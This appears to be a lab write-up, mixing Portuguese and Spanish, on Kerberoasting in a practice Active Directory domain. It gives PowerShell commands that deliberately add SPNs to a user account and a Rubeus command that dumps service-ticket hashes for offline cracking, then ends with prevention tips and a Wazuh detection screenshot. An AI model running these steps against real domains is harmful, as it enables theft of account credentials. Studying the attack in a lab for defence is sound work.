- otorgar SPN no usuario
  <img width="1411" height="427" alt="spn" src="https://github.com/user-attachments/assets/bb740067-0721-406d-98e2-17c9bd92ce41" />

o DC (PowerShell como Administrador)

1. Verificar fcastle actual
Get-ADUser -Identity "fcastle" -Properties ServicePrincipalNames

2. Agregar SPNs a fcastle (¡agora e kerberoastable!)
Opcao A: SPN de MSSQL (común)
Set-ADUser -Identity "fcastle" -ServicePrincipalNames @{Add='MSSQLSvc/HYDRA-DC.MARVEL.local:1433'}

Opcao B: SPN de HTTP (web service)
Set-ADUser -Identity "fcastle" -ServicePrincipalNames @{Add='HTTP/fcastle.marvel.local'}

Opcao C: Múltiples SPNs
Set-ADUser -Identity "fcastle" -ServicePrincipalNames @{Add='MSSQLSvc/fcastle.marvel.local:1433',
                                                           'HTTP/fcastle.marvel.local',
                                                           'CIFS/fcastle.marvel.local',
                                                           'HOST/fcastle.marvel.local'}

3. Verificar
Get-ADUser -Identity "fcastle" -Properties ServicePrincipalNames | Select-Object SamAccountName, ServicePrincipalNames

### On Windows
<img width="1430" height="139" alt="spn-service-onwindows" src="https://github.com/user-attachments/assets/a062547e-9357-4956-a0b4-7326543c6e10" />

Kerberoasting attack from linux
- como temos as pass de um usuario podemos kerberostear outros usuarios
<img width="1242" height="447" alt="ker-attack-linux" src="https://github.com/user-attachments/assets/6846b2c8-a8ee-415d-8ec1-6f75d926e6a4" />

Kerberoasting attack from Windows
.\Rubeus.exe kerberoast /outfile:spn.txt

## Prevencao

- força da senha da conta de serviço
- limitar o número de contas com SPNs e desativar aquelas que não são mais utilizadas/necessárias

## Detecção
<img width="1917" height="928" alt="Wazuh-Kerberoasting" src="https://github.com/user-attachments/assets/903096a4-1901-425d-990e-bd905008b7d6" />

  
